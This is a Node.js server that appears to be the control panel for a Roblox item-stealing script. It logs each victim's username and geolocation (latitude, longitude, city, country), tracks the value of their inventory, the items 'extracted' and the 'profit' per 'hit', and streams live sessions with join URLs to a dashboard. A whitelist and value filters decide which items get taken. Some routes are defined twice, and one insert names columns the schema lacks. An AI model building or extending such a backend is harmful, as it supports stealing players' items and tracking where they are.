const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const sqlite3 = require('sqlite3').verbose();
const fs = require('fs');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });

app.use(cors());
app.use(express.json());

let pricesData = {};
try {
  pricesData = JSON.parse(fs.readFileSync(path.join(__dirname, 'prices.json'), 'utf8'));
} catch (e) {
  console.error('Failed to load prices.json:', e.message);
}

const activeSessions = {};

// Initialize DB with new schema (status for profits, whitelist table)
const db = new sqlite3.Database(path.join(__dirname, 'database.db'), (err) => {
  if (err) console.error('Database error:', err.message);
  else console.log('Connected to SQLite database.');
});

db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS sessions (
    sessionId TEXT PRIMARY KEY,
    username TEXT,
    status TEXT,
    inventoryText TEXT,
    itemsList TEXT,
    avatarUrl TEXT,
    joinUrl TEXT,
    totalVal INTEGER,
    extractedVal INTEGER,
    startTime INTEGER,
    lastHeartbeat INTEGER,
    maxExtractedVal INTEGER DEFAULT 0,
    maxItemsList TEXT DEFAULT '[]',
    maxItemsCount INTEGER DEFAULT 0
  )`);
  db.run(`CREATE TABLE IF NOT EXISTS profits (
    sessionId TEXT PRIMARY KEY,
    username TEXT,
    avatarUrl TEXT,
    profitValue INTEGER,
    itemsCount INTEGER,
    itemsList TEXT,
    timestamp INTEGER,
    status TEXT,
    totalValue INTEGER DEFAULT 0
  )`);
  db.run(`ALTER TABLE profits ADD COLUMN totalValue INTEGER DEFAULT 0`, (err) => {});
  db.run(`CREATE TABLE IF NOT EXISTS executions (
    sessionId TEXT PRIMARY KEY,
    username TEXT,
    timestamp INTEGER,
    lat REAL DEFAULT 0,
    lon REAL DEFAULT 0,
    city TEXT DEFAULT '',
    region TEXT DEFAULT '',
    country TEXT DEFAULT ''
  )`);
  db.run(`ALTER TABLE executions ADD COLUMN lat REAL DEFAULT 0`, (err) => {});
  db.run(`ALTER TABLE executions ADD COLUMN lon REAL DEFAULT 0`, (err) => {});
  db.run(`ALTER TABLE executions ADD COLUMN city TEXT DEFAULT ''`, (err) => {});
  db.run(`ALTER TABLE executions ADD COLUMN region TEXT DEFAULT ''`, (err) => {});
  db.run(`ALTER TABLE executions ADD COLUMN country TEXT DEFAULT ''`, (err) => {});
  
  db.run(`CREATE TABLE IF NOT EXISTS whitelist (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE,
    isMain INTEGER DEFAULT 0
  )`);
  db.run(`CREATE TABLE IF NOT EXISTS item_filters (
    itemName TEXT PRIMARY KEY,
    enabled INTEGER DEFAULT 1
  )`);
  db.run(`CREATE TABLE IF NOT EXISTS system_config (
    key TEXT PRIMARY KEY,
    value TEXT
  )`);

  // Restore active sessions from DB on startup
  db.all(`SELECT * FROM sessions`, [], (err, rows) => {
    if (!err && rows) {
      rows.forEach(row => {
        activeSessions[row.sessionId] = {
          username: row.username,
          status: row.status,
          startTime: row.startTime,
          lastHeartbeat: row.lastHeartbeat,
          inventoryText: row.inventoryText,
          itemsList: row.itemsList,
          avatarUrl: row.avatarUrl,
          joinUrl: row.joinUrl,
          totalVal: row.totalVal,
          extractedVal: row.extractedVal,
          maxExtractedVal: row.maxExtractedVal || 0,
          maxItemsList: row.maxItemsList || '[]',
          maxItemsCount: row.maxItemsCount || 0
        };
      });
      console.log(`[Startup] Restored ${rows.length} active sessions from database.`);
    }
  });
});

function logProfitHit(sessionId, pAvatar, pExtracted, pItemsCount, pItemsList, pStatus, pTimestamp, pTotalValue) {
  const totalVal = pTotalValue !== undefined ? pTotalValue : (activeSessions[sessionId]?.totalVal || 0);
  if (totalVal <= 0 && pStatus !== 'waiting') {
    db.run(`DELETE FROM profits WHERE sessionId = ?`, [sessionId]);
    return;
  }
  const timestamp = pTimestamp || Date.now();
  const uName = activeSessions[sessionId]?.username || 'Unknown';
  db.run(`INSERT OR REPLACE INTO profits (sessionId, username, avatarUrl, profitValue, itemsCount, itemsList, timestamp, status, totalValue) VALUES (?,?,?,?,?,?,?,?,?)`,
    [sessionId, uName, pAvatar, pExtracted, pItemsCount, pItemsList, timestamp, pStatus, totalVal]);
}

// Duplicate protection – only one active hit per username
function enforceDuplicate(username, sessionId) {
  for (const [sid, sess] of Object.entries(activeSessions)) {
    if (sess.username === username && sid !== sessionId) {
      logProfitHit(sid, sess.avatarUrl, sess.maxExtractedVal, sess.maxItemsCount, sess.maxItemsList, 'player left', sess.startTime, sess.totalVal);
      delete activeSessions[sid];
      db.run(`DELETE FROM sessions WHERE sessionId = ?`, [sid]);
    }
  }
}

app.post('/api/start', (req, res) => {
  const { sessionId, username, avatarUrl, joinUrl, location } = req.body;
  if (!sessionId) return res.status(400).send('No sessionId');

  const now = Date.now();
  enforceDuplicate(username, sessionId);

  if (!activeSessions[sessionId]) {
    const lat = location && location.lat ? location.lat : 0;
    const lon = location && location.lon ? location.lon : 0;
    const city = location && location.city ? location.city : 'Unknown';
    const region = location && location.region ? location.region : 'Unknown';
    const country = location && location.country ? location.country : 'Unknown';

    db.run(`INSERT OR IGNORE INTO executions (sessionId, username, timestamp, lat, lon, city, region, country) VALUES (?,?,?,?,?,?,?,?)`, 
      [sessionId, username, now, lat, lon, city, region, country]);
      
    db.run(`INSERT OR REPLACE INTO sessions (sessionId, username, status, avatarUrl, joinUrl, startTime, lastHeartbeat, maxExtractedVal, maxItemsList, maxItemsCount) VALUES (?,?,?,?,?,?,?,?,?,?)`,
      [sessionId, username, 'waiting', avatarUrl || '', joinUrl || '', now, now, 0, '[]', 0]);

    activeSessions[sessionId] = {
      username,
      status: 'waiting',
      startTime: now,
      lastHeartbeat: now,
      inventoryText: '',
      itemsList: '[]',
      avatarUrl: avatarUrl || '',
      joinUrl: joinUrl || '',
      totalVal: 0,
      extractedVal: 0,
      maxExtractedVal: 0,
      maxItemsList: '[]',
      maxItemsCount: 0
    };
    
    // Log profit hit immediately so hits count increments
    logProfitHit(sessionId, avatarUrl || '', 0, 0, '[]', 'waiting', now);
  } else {
    activeSessions[sessionId].lastHeartbeat = now;
  }
  
  io.emit('session_update', activeSessions);
  res.json({ success: true });
});

app.post('/api/heartbeat', (req, res) => {
  const { sessionId } = req.body;
  if (sessionId && activeSessions[sessionId]) {
    activeSessions[sessionId].lastHeartbeat = Date.now();
    db.run(`UPDATE sessions SET lastHeartbeat = ? WHERE sessionId = ?`, [Date.now(), sessionId]);
    return res.json({ success: true });
  }
  res.status(404).json({ error: 'Session not found' });
});

app.post('/api/update', (req, res) => {
  const { sessionId, status, inventoryText, totalVal, extractedVal, avatarUrl, joinUrl, itemsList } = req.body;
  if (!sessionId) return res.status(400).send('No sessionId');

  let itemsCount = 0;
  if (itemsList && Array.isArray(itemsList)) {
    itemsCount = itemsList.reduce((a, i) => a + (i.extqty || 0), 0);
  }

  if (activeSessions[sessionId]) {
    if (totalVal !== undefined && totalVal === 0 && (status !== 'completed' && status !== 'player left')) {
      delete activeSessions[sessionId];
      db.run(`DELETE FROM sessions WHERE sessionId = ?`, [sessionId]);
      db.run(`DELETE FROM profits WHERE sessionId = ?`, [sessionId]);
      io.emit('session_update', activeSessions);
      return res.json({ success: true });
    }

    if (status) activeSessions[sessionId].status = status;
    if (inventoryText !== undefined) activeSessions[sessionId].inventoryText = inventoryText;
    if (itemsList !== undefined) activeSessions[sessionId].itemsList = JSON.stringify(itemsList);
    if (totalVal !== undefined) activeSessions[sessionId].totalVal = totalVal;
    if (extractedVal !== undefined) activeSessions[sessionId].extractedVal = extractedVal;
    if (avatarUrl) activeSessions[sessionId].avatarUrl = avatarUrl;
    if (joinUrl) activeSessions[sessionId].joinUrl = joinUrl;
    activeSessions[sessionId].lastHeartbeat = Date.now();

    // High water mark updates
    let updatedHighWater = false;
    if (extractedVal !== undefined && extractedVal > activeSessions[sessionId].maxExtractedVal) {
      activeSessions[sessionId].maxExtractedVal = extractedVal;
      updatedHighWater = true;
    }
    if (itemsList && itemsList.length > 0 && (itemsCount >= activeSessions[sessionId].maxItemsCount || activeSessions[sessionId].maxItemsList === '[]')) {
      activeSessions[sessionId].maxItemsList = JSON.stringify(itemsList);
      activeSessions[sessionId].maxItemsCount = itemsCount;
      updatedHighWater = true;
    }
    
    // Sync to DB so it counts immediately and shows correct items
    if (updatedHighWater || status) {
       logProfitHit(sessionId, activeSessions[sessionId].avatarUrl, activeSessions[sessionId].maxExtractedVal, activeSessions[sessionId].maxItemsCount, activeSessions[sessionId].maxItemsList, activeSessions[sessionId].status, activeSessions[sessionId].startTime, activeSessions[sessionId].totalVal);
    }
    io.emit('session_update', activeSessions);
  }

  db.run(`UPDATE sessions SET status = ?, inventoryText = ?, itemsList = ?, totalVal = ?, extractedVal = ?, lastHeartbeat = ? WHERE sessionId = ?`,
    [status || '', inventoryText || '', JSON.stringify(itemsList || []), totalVal || 0, extractedVal || 0, Date.now(), sessionId]);

  if (status === 'completed' || status === 'player left') {
    const finalExtracted = activeSessions[sessionId]?.maxExtractedVal || 0;
    const finalItemsList = activeSessions[sessionId]?.maxItemsList || '[]';
    const finalItemsCount = activeSessions[sessionId]?.maxItemsCount || 0;
    const pAvatar = activeSessions[sessionId]?.avatarUrl || avatarUrl || '';
    const finalStatus = status; // preserve player left or completed
    const finalTotal = activeSessions[sessionId]?.totalVal || totalVal || 0;
    logProfitHit(sessionId, pAvatar, finalExtracted, finalItemsCount, finalItemsList, finalStatus, undefined, finalTotal);

    setTimeout(() => {
      delete activeSessions[sessionId];
      io.emit('session_update', activeSessions);
      db.run(`DELETE FROM sessions WHERE sessionId = ?`, [sessionId]);
    }, 1000);
  }

  res.json({ success: true });
});

// Watchdog for abrupt disconnects
setInterval(() => {
  const now = Date.now();
  for (const sessionId in activeSessions) {
    const sess = activeSessions[sessionId];
    if (now - sess.lastHeartbeat > 10000 && sess.status !== 'player left' && sess.status !== 'completed') {
      console.log(`[Watchdog] Session ${sessionId} timed out → player left`);
      sess.status = 'player left';
      io.emit('session_update', activeSessions);
      db.run(`UPDATE sessions SET status = 'player left' WHERE sessionId = ?`, [sessionId]);
      // Log using high water mark snapshot, with the last heartbeat timestamp
      logProfitHit(sessionId, sess.avatarUrl, sess.maxExtractedVal, sess.maxItemsCount, sess.maxItemsList, 'player left', sess.lastHeartbeat, sess.totalVal);
      setTimeout(() => {
        delete activeSessions[sessionId];
        io.emit('session_update', activeSessions);
        db.run(`DELETE FROM sessions WHERE sessionId = ?`, [sessionId]);
      }, 1000);
    }
  }
}, 3000);

app.get('/api/active', (req, res) => {
  res.json(activeSessions);
});

app.get('/api/analytics', (req, res) => {
  db.all(`SELECT timestamp, totalValue, itemsCount FROM profits ORDER BY timestamp ASC`, [], (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    
    db.all(`SELECT timestamp FROM executions ORDER BY timestamp ASC`, [], (err2, executionRows) => {
      if (err2) return res.status(500).json({ error: err2.message });
      res.json({ profits: rows, executions: executionRows });
    });
  });
});

app.get('/api/executions', (req, res) => {
  db.all(`SELECT * FROM executions ORDER BY timestamp DESC LIMIT 1000`, [], (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

app.get('/api/whitelist', (req, res) => {
  db.all(`SELECT sessionId, username, avatarUrl, profitValue, itemsList, timestamp, status, totalValue FROM profits ORDER BY timestamp DESC`, [], (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    const activeIds = Object.keys(activeSessions);
    const filtered = rows.filter(row => !activeIds.includes(row.sessionId) && (row.totalValue || 0) > 0);
    res.json(filtered);
  });
});

app.get('/api/chart-data', (req, res) => {
  db.all(`SELECT profitValue, itemsCount, timestamp, totalValue FROM profits WHERE totalValue > 0 ORDER BY timestamp ASC`, [], (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

app.get('/api/previous-hits', (req, res) => {
  db.all(`SELECT sessionId, username, avatarUrl, profitValue, itemsList, timestamp, status, totalValue FROM profits ORDER BY timestamp DESC`, [], (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    const activeIds = Object.keys(activeSessions);
    const filtered = rows.filter(row => !activeIds.includes(row.sessionId) && (row.totalValue || 0) > 0);
    res.json(filtered);
  });
});

app.get('/api/executions', (req, res) => {
  db.all(`SELECT timestamp FROM executions ORDER BY timestamp ASC`, [], (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

// Whitelist endpoints
app.get('/api/whitelist', (req, res) => {
  db.all(`SELECT username, isMain, userId, avatarUrl FROM whitelist ORDER BY id ASC LIMIT 10`, [], (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

app.post('/api/whitelist/add', async (req, res) => {
  const { username } = req.body;
  if (!username) return res.status(400).send('No username');
  
  let userId = '';
  let avatarUrl = '';
  let actualUsername = username;
  
  try {
    const userRes = await fetch('https://users.roblox.com/v1/usernames/users', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ usernames: [username], excludeBannedUsers: false })
    });
    const userData = await userRes.json();
    if (userData.data && userData.data.length > 0) {
      userId = userData.data[0].id.toString();
      actualUsername = userData.data[0].name;
      
      const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`);
      const thumbData = await thumbRes.json();
      if (thumbData.data && thumbData.data.length > 0) {
        avatarUrl = thumbData.data[0].imageUrl;
      }
    } else {
      return res.status(404).json({ error: 'Player not found' });
    }
  } catch(e) {
    console.error('[Whitelist] Failed to fetch roblox user info', e);
    return res.status(500).json({ error: 'Error checking player' });
  }
  
  db.run(`INSERT OR REPLACE INTO whitelist (username, isMain, userId, avatarUrl) VALUES (?, ?, ?, ?)`, 
    [actualUsername, 0, userId, avatarUrl], 
    function (err) {
      if (err) return res.status(500).json({ error: err.message });
      res.json({ success: true, userId, avatarUrl, username: actualUsername });
    }
  );
});

app.post('/api/whitelist/remove', (req, res) => {
  const { username } = req.body;
  db.run(`DELETE FROM whitelist WHERE username = ?`, [username], function (err) {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ success: true });
  });
});

app.get('/api/prices', (req, res) => {
  res.json(pricesData);
});

// Filters endpoints
app.get('/api/filters', (req, res) => {
  db.get(`SELECT value FROM system_config WHERE key = 'minThreshold'`, [], (err, configRow) => {
    const minThreshold = configRow ? parseFloat(configRow.value) : 1.00;
    
    db.all(`SELECT itemName, enabled FROM item_filters`, [], (err, rows) => {
      if (err) return res.status(500).json({ error: err.message });
      const items = {};
      rows.forEach(row => {
        items[row.itemName] = row.enabled === 1;
      });
      res.json({ minThreshold, items });
    });
  });
});

app.post('/api/filters/save', (req, res) => {
  const { minThreshold, items } = req.body;
  
  db.serialize(() => {
    if (minThreshold !== undefined) {
      db.run(`INSERT OR REPLACE INTO system_config (key, value) VALUES ('minThreshold', ?)`, [minThreshold.toString()]);
    }
    
    if (items && typeof items === 'object') {
      const stmt = db.prepare(`INSERT OR REPLACE INTO item_filters (itemName, enabled) VALUES (?, ?)`);
      Object.entries(items).forEach(([name, enabled]) => {
        stmt.run(name, enabled ? 1 : 0);
      });
      stmt.finalize();
    }
    
    res.json({ success: true });
  });
});

// Serve static frontend files
app.use(express.static(path.join(__dirname, 'dist')));

// Fallback all other routes to index.html to support React Router (if needed)
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

const PORT = process.env.PORT || 3001;
server.listen(PORT, () => console.log(`🚀 Receptionist is running on port ${PORT}`));
